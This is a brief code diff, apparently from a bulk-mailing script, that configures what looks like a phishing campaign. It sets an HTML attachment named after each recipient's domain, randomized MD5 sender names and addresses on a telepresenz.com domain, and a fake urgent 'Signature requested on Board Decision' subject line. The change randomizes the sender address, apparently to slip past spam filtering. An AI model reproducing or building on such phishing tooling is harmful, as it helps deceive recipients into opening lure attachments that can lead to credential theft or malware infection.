@@ -122,7 +122,7 @@ const options = {
 
 
 const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['info@telepresenz.com'];
+const senderAddresses = ['{RANDOM_MD5}@telepresenz.com'];
 const messageFile = 'message.html';
 const senderNameWithPlaceholders = "{RANDOM_MD5}"; 
 const subjectLineWithPlaceholders = "Signature requested on 'Board Decision CLA {RANDOM_MD5}'- Action Required]"
